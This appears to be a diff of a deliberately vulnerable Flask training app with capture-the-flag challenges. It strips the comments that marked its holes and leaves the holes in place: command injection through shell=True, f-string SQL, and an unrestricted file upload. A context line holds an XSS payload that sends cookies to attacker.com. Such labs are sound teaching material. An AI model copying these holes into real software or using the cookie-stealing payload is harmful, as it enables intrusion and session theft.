@@ -988,22 +988,18 @@ def xss_challenge():
             '<img src=x onerror="new Image().src=\'http://attacker.com?cookie=\'+document.cookie">'
         ]
         
-        # Check if the input matches any valid payload
         if comment in valid_payloads:
-            # Instead of storing the payload, return a special response
             return render_template_string(XSS_TEMPLATE, 
                                         comments=comments, 
                                         show_flag=True,
                                         flag="FLAG{xss_master}")
         
-        # Only store non-payload comments
         with engine.connect() as conn:
             conn.execute(text("""
                 INSERT INTO comments (username, comment)
                 VALUES (:username, :comment)
             """), {"username": username, "comment": comment})
             
-            # Refresh comments after insertion
             comments = conn.execute(text("SELECT * FROM comments ORDER BY created_at DESC")).fetchall()
     
     return render_template_string(XSS_TEMPLATE, comments=comments, show_flag=False)
@@ -1018,7 +1014,6 @@ def file_upload():
         if file.filename == '':
             return render_template_string(FILE_UPLOAD_TEMPLATE, error='No file selected')
         
-        # Vulnerable to file upload
         filename = str(uuid.uuid4()) + os.path.splitext(file.filename)[1]
         file.save(os.path.join(UPLOAD_FOLDER, filename))
         
@@ -1043,10 +1038,7 @@ def command_injection():
     if request.method == 'POST':
         ip = request.form.get('ip')
         
-        # Vulnerable to command injection
         try:
-            # Using shell=True makes it more vulnerable to command injection
-            # The ping command will still work normally, but allows command injection
             result = subprocess.run(f'ping -c 4 {ip}', shell=True, capture_output=True, text=True)
             output = result.stdout
         except Exception as e:
@@ -1059,7 +1051,6 @@ def profile():
     if 'username' not in session:
         return redirect(url_for('login'))
     
-    # Vulnerable to SQL injection
     query = f"SELECT * FROM users WHERE username = '{session['username']}'"
     try:
         with engine.connect() as conn:
